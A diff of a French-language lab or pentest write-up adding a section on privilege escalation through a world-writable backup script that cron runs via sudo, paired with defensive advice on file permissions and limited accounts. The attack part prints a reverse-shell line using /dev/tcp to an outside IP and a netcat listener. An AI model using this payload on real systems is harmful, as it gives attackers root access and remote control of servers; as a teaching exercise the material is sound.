@@ -75,7 +75,7 @@ A partir de là, intépreteur de commande est donc lancé en tant **qu'administr
 
 ### Défense 1 : Erreur de capabilities
 
-#### Mise en place de la défense
+#### **Mise en place de la défense :**
 
 La manière la plus simple est d'enlever le droit d'exécution de changement des UID sur le binaire en question PHP5 : 
 
@@ -92,7 +92,134 @@ On peut donc faire en sorte de le configurer pour vérifier lorsqu'il a des mani
 
 ### Attaque 2 : Erreur de droit via sudo ou setuid
 
+#### **Introduction :**
+
+Dans cette partie, l'attaque consiste d'abord à vérifier que les droits des différents répertoires du serveur ont été correctement configurés. Afin de vérifier ça nous allons faire aussi de la reconnaissance / scan sur la machine pour vérifier cela : 
+
+#### **Reconnaisance sur le serveur :**
+
+```bash
+find / -writable  2>/dev/null | egrep '\.(sh|bash|py|rb|php)$'
+```
+
+Cette commande va nous permettre de savoir si des fichiers sont éditables sur le serveur ayant comme extension de fichier soit *.sh*, *.bash*, *.py*, *.rb* et *.php*.
+
+La commande nous retourne : 
+> /var/www/html/backup.sh
+
+Grâce à cette commande nous avons comme information que le fichier *backup.sh* est éditable en écriture et donc en lecture.
+
+Maintenant nous allons voir ce que retourne ce fichier et son contenu : 
+
+```bash
+#!/bin/bash
+################################
+
+# What to backup
+backup_files="/home /var/spool/mail /etc /root /boot /opt /etc/phpmyadmin"
+
+# Where to backup to
+dest="/mnt/backup"
+
+# Create archive filename
+day=$(date +%A)
+hostname=$(hostname -s)
+archive_file="$hostname-$day.tgz"
+
+# Backup the files using tar
+tar czf $dest/$archive_file $backup_files
+```
+
+Pour résumé, ce script permet une sauvegarde des fichiers de configurations de différents répertoires */home*, */root*, */etc* */phpmyadmin*... Et compresse tout ça via la commande **tar** pour réduire la taille de l'archive. Et pour finir cette archive est déposée dans le /mnt/backup. 
+
+Après avoir echangé à l'oral avec l'entreprise cliente, ce répertoire est leur disque dur externe permettant de faire des sauvegardes.
+
+Puis nous allons simplement vérifier les droits sur ce fichier pour s'assurer desdits droits.
+
+```bash
+ls -l /var/www/html/backup.sh
+```
+> -rwxrwxrw- 1 adminberoot vagrant   351 Feb  4 15:17 backup.sh
+
+Cependant, même si le fichier est éditable, aucun moyen de l'exécuter via l'utilisateur sur lequel nous sommes (**www-data**).
+
+En continuant la reconnaissance le serveur et avec un peu de bon sens, nous nous demandons si les backups ne sont pas faites via l'exécution d'une tâche automatique, l'utilisation la plus connue pour faire ça et la commande ***"cron"***.
+
+Pour véfifier ça nous faisons la commande : 
+
+```bash
+cat /etc/cron*
+```
+
+Qui retourne : 
+
+```bash=
+17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
+/6 * * * * adminberoot sudo /var/www/html/backup.sh
+```
+#### **Exploitation de la vulnérabilité :**
+
+En effet cela confirme que ce script s'exécute via une tâche cron avec pour droit et l'exécution, l'utilisateur ***adminberoot***.
+
+Cela donne aussi comme information que le script se lance toutes les 6 heures.
+
+Ayant comme information que la commande s'exécute via l'utilisation de ***"sudo"*** on sait que cette utilisateur posséde les droits administrateurs sur le serveur.
+
+Il nous suffit maintenant d'éditer ce script et de rajouter à la fin, à l'exécution un reverse shell : 
+
+```bash
+...
+# Backup the files using tar
+tar czf $dest/$archive_file $backup_files
+#payload
+bash -i >& /dev/tcp/34.155.229.106/8080 0>&1
+```
+
+Dorénavant il faut mettre en écoute notre serveur dit "attaquant" sur le port 8080. 
+
+Pour l'exploitation de cette vulnérabilité j'ai utilisé un serveur distant, ouvert sur Internet.
+
+Pour se mettre en écoute sur la machine attaquante :
+
+> PS : Il faudrat être patient le temps que le script s'exécute automatiquement.
+
+```bash
+nc -lvp 8080
+```
+
+Nous voilà ***root*** sur le serveur !
+
+![](https://i.imgur.com/LTLfubc.png)
+
 ### Défense 2 : Erreur de droit via sudo ou setuid
+
+#### **Mise en place de la défense :**
+
+Afin de se protéger de ce type de vulnérabilité il faut attribuer les bons droits pour chaque création de dossiers ou fichiers faites sur le serveur.
+
+Pour vérifier ça efficacement on peut utiliser cette commande : 
+
+```bash
+find / -writable  2>/dev/null
+```
+En exécutant cette commande on peut s'apercevoir des droits en écritures sur les fichiers du serveur avec l'utilisateur avec lequel nous l'avons exécutée.
+
+> PS : ***find / -writable -d 2>/dev/null*** permet voir pour les dossiers en écriture
+
+Il est aussi possible maintenant de rajouter une tâche cron uniquement pour le profil d'un utilisateur, ce qui permet qu'un attaquant voit plus difficilement toutes les tâches cron lancées en fond sur le serveur.
+
+Pour faire ça : 
+
+```bash
+crontab -e
+```
+
+> PS : Cron de l'utilisateur contenu dans /var/spool/cron/crontabs
+
+En conclusion, ce qui paraît être le meilleur moyen de se protéger de ce type d'attaque est l'utilisation d'un compte à droits très limités qui pourrait se nommé ***"backup_user"*** permettant uniquement d'exécuter sa tâche de sauvegarde.
 
 ### Attaque 3 : Erreur de mise à jours
 
